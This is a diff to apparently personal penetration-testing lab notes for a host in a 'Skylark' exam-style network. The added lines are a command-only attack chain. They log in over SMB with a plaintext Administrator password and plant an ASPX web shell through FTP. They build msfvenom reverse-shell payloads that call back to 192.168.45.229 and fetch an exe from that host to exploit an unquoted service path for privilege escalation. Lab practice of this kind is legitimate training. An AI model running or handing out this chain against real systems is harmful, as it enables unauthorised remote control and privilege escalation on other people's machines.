@@ -1014,7 +1014,7 @@ Local Admin Passwords:
 
 ```
 
-.226 (192)
+.226 (TOKYO) (192)
 ```bash
 nmap 192.168.194.226
 crackmapexec smb 192.168.194.226 -u Administrator -p MusingExtraCounty98 --continue-on-success
@@ -1041,9 +1041,33 @@ ftp_jp
 ftp ftp_jp@192.168.194.226 -p 24621
 
 # add shell to 
-/umbraco/bin/Debug/net6.0/publish/wwwroot
+cd /umbraco/bin/Debug/net6.0/publish/wwwroot
+# visit page
+http://skylark.jp:24680/umbraco/shell443.aspx
 
+# generate payloads
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.45.229 LPORT=443 -f aspx > rev443.aspx
+msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.168.45.229 LPORT=443 -f aspx > shell443.aspx
+# this one worked!
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.229 LPORT=443 -f aspx > shell2.aspx
+```
 
+.226 privesc
+```
+# find unquoted services
+wmic service get name,pathname |  findstr /i /v "C:\Windows\\" | findstr /i /v """
+
+icacls "Development Binaries 01"
+# we have write perms on the dir but not the exe inside of it, so we can do unquoted service paths exploit
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.229 LPORT=444 -f exe > Development.exe
+
+cd "c:\Skylark"
+# This exe needs to be in the same dir as "Development Binaries 01" in order to geet executed when the service is started
+iwr -uri http://192.168.45.229/Development.exe -Outfile Development.exe
+sc.exe start DevService
+
+Get-Childitem -recurse -filter "local.txt" -ErrorAction SilentlyContinue
+Get-Childitem -recurse -filter "proof.txt" -ErrorAction SilentlyContinue
 ```
 
 .227 (192)
